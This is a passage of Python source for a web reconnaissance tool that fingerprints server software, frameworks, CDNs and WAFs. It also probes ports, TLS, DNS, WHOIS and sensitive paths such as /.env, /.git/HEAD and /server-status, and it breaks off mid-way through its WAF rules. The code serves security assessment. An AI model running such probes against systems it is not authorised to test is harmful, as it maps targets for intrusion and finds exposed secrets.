#   ports        : {"<port>": "service"}
#   paths        : ["/probe/path", ...]
#   server       : [["needle", "Category", "Label"], ...]   (matched in Server header)
#   cookie       : [["needle", "Category", "Label"], ...]   (matched in Set-Cookie)
#   header       : [["header-name", "Category", "Label"|""], ...]  ("" => use the header's value)
#   content_type : [["needle", "Category", "Label"], ...]   (matched in Content-Type)
#   ext          : [["url-path regex", "Category", "Label"], ...]
#   body         : [{"any"|"all": ["needle", ...], "add": [["Category", "Label"], ...]}, ...]
_DEFAULT_FP_DB = {
    "ports": {
        "21": "ftp", "22": "ssh", "23": "telnet", "25": "smtp", "53": "dns",
        "80": "http", "110": "pop3", "111": "rpcbind", "135": "msrpc",
        "139": "netbios-ssn", "143": "imap", "389": "ldap", "443": "https",
        "445": "smb", "465": "smtps", "587": "submission", "636": "ldaps",
        "873": "rsync", "993": "imaps", "995": "pop3s", "1080": "socks",
        "1433": "mssql", "1521": "oracle", "1723": "pptp", "2049": "nfs",
        "3000": "http-dev", "3306": "mysql", "3389": "rdp", "3690": "svn",
        "4443": "https-alt", "4444": "metasploit", "5000": "http-dev",
        "5432": "postgres", "5601": "kibana", "5672": "amqp", "5900": "vnc",
        "5984": "couchdb", "6379": "redis", "6443": "kubernetes-api",
        "7000": "cassandra", "7001": "cassandra", "8000": "http-alt",
        "8008": "http-alt", "8080": "http-proxy", "8081": "http-alt",
        "8086": "influxdb", "8443": "https-alt", "8888": "http-alt",
        "9000": "http-alt", "9090": "prometheus", "9092": "kafka",
        "9200": "elasticsearch", "9300": "es-internode", "11211": "memcache",
        "27017": "mongodb",
    },
    "paths": [
        "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
        "/.well-known/openid-configuration", "/humans.txt", "/crossdomain.xml",
        "/.git/HEAD", "/.gitignore", "/.env", "/.DS_Store", "/.svn/entries",
        "/server-status", "/server-info", "/phpinfo.php", "/info.php",
        "/wp-login.php", "/wp-json/", "/administrator/", "/admin/", "/admin.php",
        "/manager/html", "/api/", "/api/v1/", "/api/v2/", "/graphql",
        "/swagger.json", "/swagger-ui/", "/openapi.json", "/v2/api-docs",
        "/actuator", "/actuator/health", "/metrics", "/health",
    ],
    "server": [
        ["apache-coyote", "Server-Software", "Apache Tomcat (Coyote)"],
        ["apache", "Server-Software", "Apache httpd"],
        ["openresty", "Server-Software", "OpenResty (nginx + Lua)"],
        ["tengine", "Server-Software", "Tengine (Alibaba nginx fork)"],
        ["nginx", "Server-Software", "nginx"],
        ["microsoft-iis", "Server-Software", "Microsoft IIS"],
        ["lighttpd", "Server-Software", "Lighttpd"],
        ["caddy", "Server-Software", "Caddy (Go)"],
        ["jetty", "Server-Software", "Eclipse Jetty (Java)"],
        ["cowboy", "Server-Software", "Cowboy (Erlang/Elixir)"],
        ["gunicorn", "Language", "Python (Gunicorn WSGI)"],
        ["uvicorn", "Language", "Python (Uvicorn ASGI)"],
        ["hypercorn", "Language", "Python (Hypercorn ASGI)"],
        ["werkzeug", "Framework", "Flask / Werkzeug (Python)"],
        ["phusion passenger", "Framework", "Ruby (Phusion Passenger)"],
        ["puma", "Framework", "Ruby (Puma)"],
        ["unicorn", "Framework", "Ruby (Unicorn)"],
        ["kestrel", "Server-Software", "Kestrel (.NET)"],
        ["express", "Framework", "Express (Node.js)"],
        ["haproxy", "Proxy / LB", "HAProxy"],
        ["varnish", "Proxy / LB", "Varnish Cache"],
        ["traefik", "Proxy / LB", "Traefik"],
        ["envoy", "Proxy / LB", "Envoy"],
        ["istio", "Proxy / LB", "Istio / Envoy sidecar"],
        ["amazons3", "Hosting", "AWS S3"],
        ["googlefe", "Hosting", "Google Frontend"],
        ["wallarm", "WAF", "Wallarm"],
    ],
    "cookie": [
        ["phpsessid", "Language", "PHP"],
        ["jsessionid", "Language", "Java (servlet)"],
        ["asp.net_sessionid", "Framework", "ASP.NET (WebForms / MVC)"],
        [".aspnet.applicationcookie", "Framework", "ASP.NET Identity"],
        ["__requestverificationtoken", "Framework", "ASP.NET MVC (anti-forgery)"],
        ["arraffinity", "Hosting", "Azure App Service"],
        ["laravel_session", "Framework", "Laravel (PHP)"],
        ["xsrf-token", "Framework", "Laravel / Angular (XSRF)"],
        ["csrftoken", "Framework", "Django (Python)"],
        ["django_language", "Framework", "Django (Python)"],
        ["_rails_session", "Framework", "Ruby on Rails"],
        ["_session_id", "Framework", "Ruby on Rails / Sinatra"],
        ["symfony", "Framework", "Symfony (PHP)"],
        ["ci_session", "Framework", "CodeIgniter (PHP)"],
        ["cakephp", "Framework", "CakePHP (PHP)"],
        ["fuelid", "Framework", "FuelPHP (PHP)"],
        ["yiisession", "Framework", "Yii (PHP)"],
        ["connect.sid", "Framework", "Express / Connect (Node.js)"],
        ["express.sid", "Framework", "Express (Node.js)"],
        ["koa.sid", "Framework", "Koa.js (Node.js)"],
        ["koa:sess", "Framework", "Koa.js (Node.js)"],
        ["sails.sid", "Framework", "Sails.js (Node.js)"],
        ["hapi-session", "Framework", "Hapi.js (Node.js)"],
        ["_phoenix_session", "Framework", "Phoenix (Elixir)"],
        ["_phoenix_", "Framework", "Phoenix (Elixir)"],
        ["plack_session", "Framework", "Perl (Plack)"],
        ["roundcube_sessid", "Application", "Roundcube webmail"],
        ["gx_session", "Application", "Genexus"],
        ["_pk_id", "Analytics", "Matomo"],
    ],
    "header": [
        ["cf-ray", "CDN", "Cloudflare"],
        ["cf-cache-status", "CDN", "Cloudflare"],
        ["x-amz-cf-id", "CDN", "AWS CloudFront"],
        ["x-amz-cf-pop", "CDN", "AWS CloudFront"],
        ["x-azure-ref", "CDN", "Azure Front Door"],
        ["x-azure-fdid", "CDN", "Azure Front Door"],
        ["x-served-by", "CDN", "Fastly (likely)"],
        ["x-fastly-request-id", "CDN", "Fastly"],
        ["x-akamai-transformed", "CDN", "Akamai"],
        ["x-akamai-request-id", "CDN", "Akamai"],
        ["x-cdn", "CDN", ""],
        ["x-vercel-id", "Hosting", "Vercel"],
        ["x-nf-request-id", "Hosting", "Netlify"],
        ["x-github-request-id", "Hosting", "GitHub Pages"],
        ["x-render-origin-server", "Hosting", "Render"],
        ["fly-request-id", "Hosting", "Fly.io"],
        ["x-railway-edge", "Hosting", "Railway"],
        ["x-cloud-trace-context", "Hosting", "Google Cloud"],
        ["x-goog-generation", "Hosting", "Google Cloud Storage"],
        ["do-app-origin", "Hosting", "DigitalOcean App Platform"],
        ["x-do-app-origin", "Hosting", "DigitalOcean App Platform"],
    ],
    "content_type": [
        ["application/json", "Content-Type", "JSON"],
        ["application/grpc-web", "API", "gRPC-Web"],
        ["application/vnd.api+json", "API", "JSON:API"],
        ["application/hal+json", "API", "HAL"],
        ["application/json-rpc", "API", "JSON-RPC"],
        ["application/soap+xml", "API", "SOAP"],
    ],
    "ext": [
        [r"\.(php|php\d|phtml)(?:/|$)", "Language", "PHP"],
        [r"\.(aspx?|asmx|ashx|cshtml)(?:/|$)", "Language", ".NET (ASP)"],
        [r"\.(jsp|jspx|do|action)(?:/|$)", "Language", "Java (servlet)"],
        [r"\.(cgi|pl)(?:/|$)", "Language", "Perl / CGI"],
        [r"\.rb(?:/|$)", "Language", "Ruby"],
        [r"\.py(?:/|$)", "Language", "Python"],
        [r"\.(go)(?:/|$)", "Language", "Go"],
    ],
    "body": [
        {"any": ["wp-content", "/wp-includes/", "wp-json"], "add": [["CMS", "WordPress"]]},
        {"any": ["woocommerce"], "add": [["CMS", "WooCommerce (WordPress)"]]},
        {"any": ["drupal.settings", "/sites/default/files"], "add": [["CMS", "Drupal"]]},
        {"any": ["joomla!", "/media/jui/"], "add": [["CMS", "Joomla"]]},
        {"any": ["/ghost/"], "add": [["CMS", "Ghost"]]},
        {"any": ["craftcms", "/cpresources/"], "add": [["CMS", "Craft CMS"]]},
        {"any": ["cdn.shopify.com", "shopify-payment-button"], "add": [["Platform", "Shopify"]]},
        {"any": ["static.wixstatic.com"], "add": [["Platform", "Wix"]]},
        {"any": ["static1.squarespace.com"], "add": [["Platform", "Squarespace"]]},
        {"any": ["__next_data__", "/_next/static"], "add": [["Framework", "Next.js"], ["Library", "React"]]},
        {"any": ["__nuxt__", "/_nuxt/"], "add": [["Framework", "Nuxt.js"], ["Library", "Vue.js"]]},
        {"any": ["window.___gatsby", "/page-data/"], "add": [["Framework", "Gatsby"], ["Library", "React"]]},
        {"any": ["/_astro/", "astro-island"], "add": [["Framework", "Astro"]]},
        {"any": ["sveltekit", "data-sveltekit"], "add": [["Framework", "SvelteKit"], ["Library", "Svelte"]]},
        {"any": ["__remix", "remix-context"], "add": [["Framework", "Remix"]]},
        {"any": ["hx-get", "hx-post", "htmx.org"], "add": [["Library", "htmx"]]},
        {"any": ["_blazor", "blazor.server.js", "blazor.webassembly.js"], "add": [["Framework", "Blazor (.NET)"]]},
        {"any": ["flutter_service_worker", "flutter.js", "main.dart.js"], "add": [["Framework", "Flutter Web"]]},
        {"any": ["data-turbo", "turbo-frame"], "add": [["Library", "Hotwire Turbo"]]},
        {"any": ["stimulus", "data-controller="], "add": [["Library", "Stimulus"]]},
        {"any": ["jquery"], "add": [["Library", "jQuery"]]},
        {"any": ["bootstrap.min.css", "bootstrap.css"], "add": [["Library", "Bootstrap"]]},
        {"any": ["tailwind"], "add": [["Library", "Tailwind CSS"]]},
        {"any": ["lodash"], "add": [["Library", "Lodash"]]},
        {"any": ["moment.js", "moment.min.js"], "add": [["Library", "Moment.js"]]},
        {"any": ["d3.js", "/d3.v"], "add": [["Library", "D3.js"]]},
        {"any": ["three.js", "/three.min.js"], "add": [["Library", "Three.js"]]},
        {"any": ["magento", "/skin/frontend/", "mage/cookies"], "add": [["CMS", "Magento"]]},
        {"any": ["prestashop"], "add": [["CMS", "PrestaShop"]]},
        {"any": ["/typo3/", "typo3-cms"], "add": [["CMS", "TYPO3"]]},
        {"any": ["sitecore", "/sitecore/"], "add": [["CMS", "Sitecore (.NET)"]]},
        {"any": ["umbraco"], "add": [["CMS", "Umbraco (.NET)"]]},
        {"any": ["bitrix", "/bitrix/"], "add": [["CMS", "Bitrix"]]},
        {"any": ["contentful", "images.ctfassets.net"], "add": [["CMS", "Contentful (headless)"]]},
        {"any": ["sanity.io", "cdn.sanity.io"], "add": [["CMS", "Sanity (headless)"]]},
        {"any": ["bigcommerce"], "add": [["Platform", "BigCommerce"]]},
        {"any": ["webflow", "assets.website-files.com"], "add": [["Platform", "Webflow"]]},
        {"any": ["salesforce-", "force.com"], "add": [["Platform", "Salesforce Commerce / Force.com"]]},
        {"any": ["streamlit"], "add": [["Framework", "Streamlit (Python)"]]},
        {"any": ["gradio"], "add": [["Framework", "Gradio (Python)"]]},
        {"any": ["javax.faces", "jsf.js", "/javax.faces.resource/"], "add": [["Framework", "JSF (Java)"]]},
        {"any": ["vaadin"], "add": [["Framework", "Vaadin (Java)"]]},
        {"any": ["webpackchunk", "/webpack-"], "add": [["Build Tool", "Webpack"]]},
        {"any": ["/@vite/", "data-vite-", "vite/client"], "add": [["Build Tool", "Vite"]]},
        {"any": ["/parcel-", "parcelrequire"], "add": [["Build Tool", "Parcel"]]},
        {"any": ["/socket.io/"], "add": [["Real-time", "Socket.IO"]]},
        {"any": ["pusher.com/", "pusher-js"], "add": [["Real-time", "Pusher"]]},
        {"any": ["ably.io"], "add": [["Real-time", "Ably"]]},
        {"any": ["pubnub"], "add": [["Real-time", "PubNub"]]},
        {"any": ["/graphql", "__apollo_state__"], "add": [["API", "GraphQL"]]},
        {"any": ["swagger-ui", "/swagger"], "add": [["API", "Swagger / OpenAPI"]]},
        {"any": ["\"openapi\":"], "add": [["API", "OpenAPI"]]},
        {"any": ["googletagmanager", "google-analytics"], "add": [["Analytics", "Google Analytics / GTM"]]},
        {"any": ["connect.facebook.net", "fbevents.js"], "add": [["Analytics", "Meta Pixel"]]},
        {"any": ["static.hotjar.com"], "add": [["Analytics", "Hotjar"]]},
        {"any": ["plausible.io/js/"], "add": [["Analytics", "Plausible"]]},
        {"any": ["matomo.js"], "add": [["Analytics", "Matomo"]]},
        {"any": ["cdn.mxpnl.com", "mixpanel"], "add": [["Analytics", "Mixpanel"]]},
        {"any": ["cdn.segment.com"], "add": [["Analytics", "Segment"]]},
        {"any": ["cdn.heapanalytics.com"], "add": [["Analytics", "Heap"]]},
        {"any": ["omtrdc.net", "demdex.net"], "add": [["Analytics", "Adobe Analytics"]]},
        {"any": ["fullstory.com"], "add": [["Analytics", "FullStory"]]},
        {"any": ["cdn.amplitude.com"], "add": [["Analytics", "Amplitude"]]},
        {"any": ["cdn.cookielaw.org", "onetrust"], "add": [["Privacy", "OneTrust"]]},
    ],
}


def _fp_db_path():
    """Where the editable fingerprint corpus lives. Override with RECONNER_FP_DB;
    otherwise it sits next to this script."""
    env = os.environ.get('RECONNER_FP_DB')
    if env:
        return env
    try:
        here = os.path.dirname(os.path.abspath(__file__))
    except Exception:
        here = os.getcwd()
    return os.path.join(here, 'reconner_fingerprints.json')


def _merge_fp_db(base, override):
    """Merge a user corpus over the defaults: dict tables update key-wise, list
    tables are extended (de-duplicated), unknown keys are added as-is."""
    out = {k: (dict(v) if isinstance(v, dict) else list(v))
           for k, v in base.items()}
    for k, v in (override or {}).items():
        if isinstance(v, dict) and isinstance(out.get(k), dict):
            out[k].update(v)
        elif isinstance(v, list) and isinstance(out.get(k), list):
            for item in v:
                if item not in out[k]:
                    out[k].append(item)
        else:
            out[k] = v
    return out


def _load_fp_db():
    """Load the fingerprint corpus: a user file (merged over the defaults) if one
    exists, otherwise the built-in defaults held in memory. The defaults are NO
    LONGER materialised to disk — nothing is written here, so the app never
    auto-creates reconner_fingerprints.json. (A user can still drop their own file
    at _fp_db_path() / RECONNER_FP_DB to extend the corpus.) Always degrades to
    the built-in defaults on any error."""
    defaults = {k: (dict(v) if isinstance(v, dict) else list(v))
                for k, v in _DEFAULT_FP_DB.items()}
    path = _fp_db_path()
    try:
        if os.path.isfile(path):
            with open(path, 'r', encoding='utf-8') as f:
                return _merge_fp_db(defaults, json.load(f))
    except Exception:
        pass
    return defaults


FP_DB = _load_fp_db()
# Derived views kept for the port/path probes (built from whatever corpus loaded).
_FP_COMMON_PORTS = sorted(int(p) for p in FP_DB.get('ports', {}))
_FP_PORT_SERVICE = {int(p): s for p, s in FP_DB.get('ports', {}).items()}
_FP_COMMON_PATHS = list(FP_DB.get('paths', []))


def _fp_probe_http(url: str):
    """First-pass HTTP probe: returns (section_text, response_or_None)."""
    if not REQUESTS_AVAILABLE:
        return '── HTTP ──\n  [requests not installed]', None
    try:
        r = requests.get(url, timeout=10, allow_redirects=True, verify=False,
                         headers={'User-Agent': _FP_UA})
    except Exception as e:
        return f'── HTTP ──\n  Error probing {url}: {e}', None

    findings: dict[str, list[str]] = {}

    def add(cat, item):
        """Record a detected technology `item` under category `cat`, de-duped."""
        bucket = findings.setdefault(cat, [])
        if item and item not in bucket:
            bucket.append(item)

    headers = r.headers
    hdr_low = {k.lower(): v for k, v in headers.items()}
    body = r.text[:400000]
    body_low = body.lower()

    if 'server' in hdr_low:        add('Server', hdr_low['server'])
    if 'x-powered-by' in hdr_low:  add('Powered By', hdr_low['x-powered-by'])
    if 'x-aspnet-version' in hdr_low:
        add('Framework', f"ASP.NET {hdr_low['x-aspnet-version']}")
    if 'x-aspnetmvc-version' in hdr_low:
        add('Framework', f"ASP.NET MVC {hdr_low['x-aspnetmvc-version']}")
    if 'x-generator' in hdr_low:   add('Generator', hdr_low['x-generator'])
    if 'x-drupal-cache' in hdr_low: add('CMS', 'Drupal')

    # Refine Server header into specific software / language buckets (corpus-driven).
    srv = hdr_low.get('server', '').lower()
    for needle, cat, label in FP_DB.get('server', []):
        if needle in srv:
            add(cat, label)

    cookies_low = ' ; '.join(headers.values()).lower()
    for needle, cat, label in FP_DB.get('cookie', []):
        if needle in cookies_low:
            add(cat, label)

    # Header-name signatures (CDN / hosting). An empty label means "report the
    # header's own value" (e.g. the X-CDN header names the CDN).
    for needle, cat, label in FP_DB.get('header', []):
        if needle in hdr_low:
            add(cat, label or hdr_low.get(needle, 'unknown'))
    # Heroku marker is the value of the Via header, not its name.
    if 'vegur' in hdr_low.get('via', '').lower():
        add('Hosting', 'Heroku')

    m = re.search(r'<meta\s+name=["\']generator["\']\s+content=["\']([^"\']+)["\']',
                  body, re.I)
    if m:
        add('Generator', m.group(1))

    # Corpus-driven body signatures: substring matchers for CMS / framework /
    # library / build-tool / real-time / analytics / platform technologies.
    # Each entry matches if 'any' (or 'all') of its needles appear in the body,
    # then contributes one or more (Category, Label) findings.
    for entry in FP_DB.get('body', []):
        needles = entry.get('all') or entry.get('any') or []
        if not needles:
            continue
        combine = all if entry.get('all') else any
        if combine(s in body_low for s in needles):
            for cat, label in entry.get('add', []):
                add(cat, label)

    # ── Heuristics that need code, not a flat table ────────────────────
    # Front-end library, lowest-priority (only if a bundle didn't already name
    # one); needs a regex + the "already found?" guard, so it stays inline.
    if 'Library' not in findings:
        if 'data-reactroot' in body_low or 'data-react-helmet' in body_low:
            add('Library', 'React')
        elif re.search(r'ng-version=["\']', body, re.I) or 'ng-controller' in body_low:
            add('Library', 'Angular')
        elif 'data-v-' in body or '__vue__' in body_low or 'vue.js' in body_low:
            add('Library', 'Vue.js')
    # Strapi only counts when corroborated by a header (avoids false positives
    # from the word appearing in copy), so it can't be a plain body needle.
    if 'strapi' in body_low and ('strapi' in hdr_low.get('x-powered-by', '').lower()
                                  or '/strapi/' in body_low):
        add('CMS', 'Strapi (headless)')
    if 'upgrade' in hdr_low and 'websocket' in hdr_low.get('upgrade', '').lower():
        add('Real-time', 'WebSocket upgrade hinted')
    if re.search(r'<link\s+rel=["\']manifest["\']', body, re.I):
        add('Platform', 'PWA (Web App Manifest)')
    if re.search(r'<meta\s+name=["\']apple-mobile-web-app', body, re.I):
        add('Platform', 'Apple Mobile Web App')

    # File-extension language hints from the URL path (corpus-driven regexes).
    url_path_low = urlparse(r.url).path.lower()
    for pat, cat, label in FP_DB.get('ext', []):
        try:
            if re.search(pat, url_path_low):
                add(cat, label)
        except re.error:
            continue

    # Content-Type signatures (corpus-driven).
    ct_low = hdr_low.get('content-type', '').lower()
    for needle, cat, label in FP_DB.get('content_type', []):
        if needle in ct_low:
            add(cat, label)
    # API styles that need a body OR path test in addition to Content-Type.
    if 'application/json-rpc' in ct_low or '"jsonrpc"' in body_low:
        add('API', 'JSON-RPC')
    if 'odata' in ct_low or 'odata.context' in body_low:
        add('API', 'OData')
    if '<soap:' in body_low or '<methodcall>' in body_low or '?wsdl' in body_low:
        add('API', 'SOAP / XML-RPC')
    if re.search(r'/v\d+/[a-z]', url_path_low) or '/api/' in url_path_low or '/rest/' in url_path_low:
        add('API', 'REST-style endpoint path')

    # Tech-only output: just the technologies detected, grouped by category.
    out = ['── Server & Application Signatures ──']
    order = ['Server-Software', 'Server', 'Powered By', 'Language', 'Framework',
             'Library', 'Build Tool', 'Real-time', 'CMS', 'Platform',
             'Application', 'Generator', 'API', 'Content-Type', 'CDN',
             'Hosting', 'Proxy / LB', 'WAF', 'Analytics']
    found_any = False
    for cat in order:
        if cat in findings:
            found_any = True
            out.append(f'  {cat}:')
            for item in findings[cat]:
                out.append(f'    • {item}')
    if not found_any:
        out.append('  (no technology signatures matched)')
    return '\n'.join(out), r


def _fp_probe_wappalyzer(url, response):
    """Run python-Wappalyzer against the landing response and return a formatted
    technology list (name + versions + categories). Wappalyzer's bundled
    apps.json emits malformed-regex UserWarnings at compile time, so they are
    suppressed. Returns an error/empty note on failure or no match."""
    try:
        with warnings.catch_warnings():
            warnings.simplefilter('ignore', UserWarning)
            wapp = Wappalyzer.latest()
            wp = WebPage.new_from_response(response)
            tech = wapp.analyze_with_versions_and_categories(wp)
        if not tech:
            return '── Detected Technologies ──\n  (no signatures matched)'
        out = ['── Detected Technologies ──']
        for name, info in sorted(tech.items()):
            versions = info.get('versions') or []
            cats = info.get('categories') or []
            v = (' ' + ' / '.join(versions)) if versions else ''
            c = (f"  [{', '.join(cats)}]") if cats else ''
            out.append(f'  • {name}{v}{c}')
        return '\n'.join(out)
    except Exception as e:
        return f'── Detected Technologies ──\n  (error: {e})'


# Security-relevant response headers, reported as present (with value) or
# missing. Reuses the landing response — no extra request — so it is free and
# safe to run in every mode. Reveals posture (HSTS/CSP/etc.) and often the
# stack / proxy too.
_SEC_HEADERS = [
    ('Strict-Transport-Security',     'HSTS'),
    ('Content-Security-Policy',       'CSP'),
    ('X-Frame-Options',               'X-Frame-Options'),
    ('X-Content-Type-Options',        'X-Content-Type-Options'),
    ('Referrer-Policy',               'Referrer-Policy'),
    ('Permissions-Policy',            'Permissions-Policy'),
    ('Cross-Origin-Opener-Policy',    'COOP'),
    ('Cross-Origin-Embedder-Policy',  'COEP'),
    ('Cross-Origin-Resource-Policy',  'CORP'),
    ('X-XSS-Protection',              'X-XSS-Protection'),
]


def _fp_probe_sec_headers(response):
    """Report security-relevant response headers (HSTS/CSP/etc.) as present (with
    value) or missing, plus session-cookie flags, reusing the landing response so
    it costs no extra request."""
    if response is None:
        return ''
    h = {k.lower(): v for k, v in response.headers.items()}
    present, missing = [], []
    for header, label in _SEC_HEADERS:
        v = h.get(header.lower())
        if v:
            present.append(f'  • {label}: {v if len(v) <= 90 else v[:87] + "…"}')
        else:
            missing.append(label)
    cookie = (response.headers.get('Set-Cookie') or '').lower()
    if cookie:
        flags = ', '.join(f'{f}={"yes" if f in cookie else "no"}'
                          for f in ('httponly', 'secure', 'samesite'))
        present.append(f'  • Session-cookie flags: {flags}')
    out = ['── Security Headers ──']
    out += present if present else ['  (no hardening headers present)']
    if missing:
        out.append('  Missing: ' + ', '.join(missing))
    return '\n'.join(out)


def _fp_probe_tls(host, port):
    """Open a TLS connection and report the negotiated protocol, cipher, ALPN,
    and certificate subject/issuer/validity/SANs. Advertises both h2 and
    http/1.1 so the server's preference shows. Certificate validation is
    disabled (recon, not trust). Returns an error note on failure."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_alpn_protocols(['h2', 'http/1.1'])
        except Exception:
            pass
        with socket.create_connection((host, port), timeout=6) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ss:
                cert = ss.getpeercert()
                cipher = ss.cipher()
                version = ss.version()
                try:
                    alpn = ss.selected_alpn_protocol()
                except Exception:
                    alpn = None
        out = ['── TLS ──',
               f'  Protocol: {version}',
               f'  Cipher:   {cipher[0]} ({cipher[2]} bits)' if cipher else '  Cipher:   ?']
        if alpn:
            out.append(f'  ALPN:     {alpn}')
        if cert:
            subj = dict(x[0] for x in cert.get('subject', []))
            iss  = dict(x[0] for x in cert.get('issuer', []))
            out.append(f'  Subject:  CN={subj.get("commonName", "?")}')
            out.append(f'  Issuer:   CN={iss.get("commonName", "?")}, '
                       f'O={iss.get("organizationName", "?")}')
            out.append(f'  Valid:    {cert.get("notBefore")} → {cert.get("notAfter")}')
            sans = cert.get('subjectAltName', [])
            if sans:
                out.append('  SANs:')
                for _typ, name in sans[:40]:
                    out.append(f'    • {name}')
        return '\n'.join(out)
    except Exception as e:
        return f'── TLS ──\n  (error: {e})'


def _fp_probe_dns(host):
    """Resolve common DNS record types (A/AAAA/CNAME/MX/NS/TXT/SOA/CAA) for the
    host via dnspython, falling back to a basic gethostbyname lookup when it
    isn't installed. Returns '' when nothing resolves."""
    out = ['── DNS ──']
    found = False
    if DNS_AVAILABLE:
        resolver = dns.resolver.Resolver()
        resolver.lifetime = 5
        for rtype in ('A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA', 'CAA'):
            try:
                ans = resolver.resolve(host, rtype)
                found = True
                out.append(f'  {rtype}:')
                for r in ans:
                    out.append(f'    • {r.to_text()}')
            except Exception:
                pass
    else:
        try:
            name, aliases, ips = socket.gethostbyname_ex(host)
            found = True
            out.append(f'  Canonical: {name}')
            if aliases:
                out.append(f'  Aliases:   {", ".join(aliases)}')
            out.append(f'  A:         {", ".join(ips)}')
        except Exception as e:
            out.append(f'  (lookup failed: {e})')
    return '\n'.join(out) if found else ''


def _fp_probe_whois(host):
    """Look up WHOIS registration details (registrar, dates, name servers, org,
    country, contact emails) for the host's registrable domain. Returns '' when
    nothing useful comes back, or an error note on failure."""
    try:
        labels = host.split('.')
        domain = '.'.join(labels[-2:]) if len(labels) > 2 else host
        w = whois_lib.whois(domain)
        out = ['── WHOIS ──', f'  Domain: {domain}']
        for k in ('registrar', 'creation_date', 'expiration_date',
                  'updated_date', 'name_servers', 'org', 'country',
                  'emails'):
            v = w.get(k) if isinstance(w, dict) else getattr(w, k, None)
            if v:
                if isinstance(v, (list, tuple, set)):
                    v = ', '.join(sorted({str(x) for x in v}))
                out.append(f'  {k}: {v}')
        return '\n'.join(out) if len(out) > 2 else ''
    except Exception as e:
        return f'── WHOIS ──\n  (error: {e})'


def _fp_probe_common_paths(base_url):
    """Probe a list of well-known/interesting paths and report which exist.
    First calibrates against two guaranteed-nonexistent paths so a catch-all
    (SPA/framework fallback) that 200s for everything can be detected by its
    content length and filtered out."""
    if not REQUESTS_AVAILABLE:
        return ''
    session = requests.Session()
    session.verify = False
    session.headers['User-Agent'] = _FP_UA

    fallback_lengths: set[int] = set()
    for sentinel in ('/__reconner_404_probe_1__',
                     f'/__reconner_404_probe_{os.urandom(4).hex()}__'):
        try:
            r = session.get(urljoin(base_url, sentinel), timeout=6,
                            allow_redirects=False)
            if r.status_code < 400:
                fallback_lengths.add(len(r.content))
        except Exception:
            pass

    found = []
    lock = threading.Lock()

    def check(path):
        """Request one path and record it (with status and length) if it exists
        (2xx/3xx) or is access-controlled (401/403). Thread-safe."""
        try:
            r = session.get(urljoin(base_url, path), timeout=6,
                            allow_redirects=False)
        except Exception:
            return
        if r.status_code < 400 or r.status_code in (401, 403):
            with lock:
                found.append((path, r.status_code, len(r.content)))

    threads = [threading.Thread(target=check, args=(p,), daemon=True)
               for p in _FP_COMMON_PATHS]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=8)

    def _is_fallback_len(length):
        """True if `length` matches a calibrated catch-all fallback size, within
        tolerance — SPA shells vary by a few bytes per request (nonce/timestamp/
        per-route title), so an exact compare would miss them."""
        return any(abs(length - fl) <= max(64, int(fl * 0.02))
                   for fl in fallback_lengths)
    real = [(p, s, l) for (p, s, l) in found
            if not (s < 400 and _is_fallback_len(l))]

    out = ['── Common Paths ──']
    if fallback_lengths:
        out.append(f'  (catch-all fallback detected — {len(found) - len(real)}'
                   f' path(s) hidden, fallback size(s): '
                   f'{", ".join(str(x) + " B" for x in sorted(fallback_lengths))})')
    if not real and not fallback_lengths:
        return ''
    if not real:
        return '\n'.join(out)
    real.sort(key=lambda x: (x[1], x[0]))
    for path, status, length in real:
        out.append(f'  • {status}  {length:>7} B  {path}')
    return '\n'.join(out)


def _fp_probe_options(url):
    """OPTIONS / probe — surfaces Allow / CORS methods. Picks up WebDAV
    (PROPFIND/MKCOL/…) and the still-common-misconfig TRACE method."""
    if not REQUESTS_AVAILABLE:
        return ''
    try:
        r = requests.options(url, timeout=6, verify=False,
                             allow_redirects=False,
                             headers={'User-Agent': _FP_UA})
    except Exception:
        return ''
    lines = []
    allow = r.headers.get('Allow') or r.headers.get('allow')
    if allow:
        lines.append(f'  Allow: {allow}')
    cors = (r.headers.get('Access-Control-Allow-Methods')
            or r.headers.get('access-control-allow-methods'))
    if cors:
        lines.append(f'  Access-Control-Allow-Methods: {cors}')
    dav = r.headers.get('DAV') or r.headers.get('dav')
    if dav:
        lines.append(f'  DAV: {dav}  (WebDAV enabled)')
    combined = (allow or '') + ' ' + (cors or '')
    if 'TRACE' in combined.upper():
        lines.append('  ⚠ TRACE method advertised')
    for verb in ('PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE',
                 'LOCK', 'UNLOCK', 'REPORT', 'CHECKOUT'):
        if verb in combined.upper():
            lines.append(f'  ⚠ WebDAV verb advertised: {verb}')
    if not lines:
        return ''
    return '── HTTP OPTIONS ──\n' + '\n'.join(lines)


def _fp_probe_robots(base_url):
    """If /robots.txt is real text, surface a snippet — it routinely leaks
    framework hints, admin paths and sitemap locations."""
    if not REQUESTS_AVAILABLE:
        return ''
    try:
        r = requests.get(urljoin(base_url, '/robots.txt'), timeout=5,
                         verify=False, allow_redirects=False,
                         headers={'User-Agent': _FP_UA})
    except Exception:
        return ''
    if r.status_code >= 400:
        return ''
    if 'text' not in r.headers.get('Content-Type', 'text/plain').lower():
        return ''
    body = r.text.strip()
    if not body or '<html' in body[:200].lower():
        return ''
    # Cap so we don't spam the report with a 50 KB robots.
    if len(body) > 3500:
        body = body[:3500] + '\n... [truncated]'
    return '── robots.txt ──\n' + '\n'.join('  ' + line for line in body.splitlines())


# Signatures for WAFs, bot-defenses and CDN security shields. Each tuple is
# (display_name, predicate(headers_lower, cookies_lower, body_lower, status)).
_FP_WAF_RULES = [
    ('Cloudflare',          lambda h, c, b, s: 'cf-ray' in h or 'cf-cache-status' in h
                                                or '__cf_bm' in c or 'cf_clearance' in c),
    ('Sucuri CloudProxy',   lambda h, c, b, s: 'x-sucuri-id' in h or 'x-sucuri-cache' in h),
    ('Akamai',              lambda h, c, b, s: any(k.startswith('x-akamai') for k in h)
                                                or 'akamaighost' in h.get('server', '')),
    ('Imperva / Incapsula', lambda h, c, b, s: 'x-iinfo' in h or 'incap_ses' in c
                                                or 'visid_incap' in c),
    ('AWS WAF',             lambda h, c, b, s: 'awswaf' in c
                                                or ('x-amzn-requestid' in h and s in (403, 405))),
    ('AWS CloudFront',      lambda h, c, b, s: 'x-amz-cf-id' in h or 'x-amz-cf-pop' in h),
    ('F5 BIG-IP / ASM',     lambda h, c, b, s: 'bigipserver' in c or 'tsessionid' in c
